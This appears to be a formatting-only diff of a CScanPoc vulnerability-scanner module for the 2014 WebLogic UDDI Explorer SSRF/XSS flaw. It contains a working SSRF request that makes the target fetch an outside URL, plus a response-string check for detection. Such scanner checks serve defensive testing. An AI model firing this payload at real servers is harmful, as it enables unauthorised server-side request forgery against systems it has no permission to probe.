@@ -4,11 +4,12 @@ from CScanPoc.thirdparty import requests
 from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
 import re
 
+
 class Vuln(ABVuln):
-    vuln_id = 'WebLogic_0001' # 平台漏洞编号，留空
+    vuln_id = 'WebLogic_0001'  # 平台漏洞编号，留空
     name = 'WebLogic SSRF And XSS'  # 漏洞名称
     level = VulnLevel.HIGH  # 漏洞危害级别
-    type = VulnType.XSS # 漏洞类型
+    type = VulnType.XSS  # 漏洞类型
     disclosure_date = '2014-06-17'  # 漏洞公布时间
     desc = '''
         Unspecified vulnerability in the Oracle WebLogic Server component in Oracle Fusion Middleware 10.0.2.0 and 10.3.6.0 allows remote attackers to affect integrity via vectors related to WLS - Web Services.
@@ -23,6 +24,7 @@ class Vuln(ABVuln):
     product = 'WebLogic'  # 漏洞应用名称
     product_version = 'Unknown'  # 漏洞应用版本
 
+
 class Poc(ABPoc):
     poc_id = '64f55f8a-4a9b-40c9-8850-bb89f56db607'
     author = '47bwy'  # POC编写者
@@ -35,13 +37,14 @@ class Poc(ABPoc):
         try:
             self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                 target=self.target, vuln=self.vuln))
-            
+
             payload = '/uddiexplorer/SearchPublicRegistries.jsp?operator=http://0day5.com/robots.txt&rdoSearch=name&txtSearchname=sdf&txtSearchkey=&txtSearchfor=&selfor=Business+location&btnSubmit=Search'
             verify_url = self.target + payload
             r = requests.get(verify_url)
-            m = re.search('weblogic.uddi.client.structures.exception.XML_SoapException', r.content)
+            m = re.search(
+                'weblogic.uddi.client.structures.exception.XML_SoapException', r.content)
             if m:
-                #security_warning(url)
+                # security_warning(url)
                 self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                     target=self.target, name=self.vuln.name))
 
@@ -50,6 +53,7 @@ class Poc(ABPoc):
 
     def exploit(self):
         self.verify()
+
 
 if __name__ == '__main__':
     Poc().run()
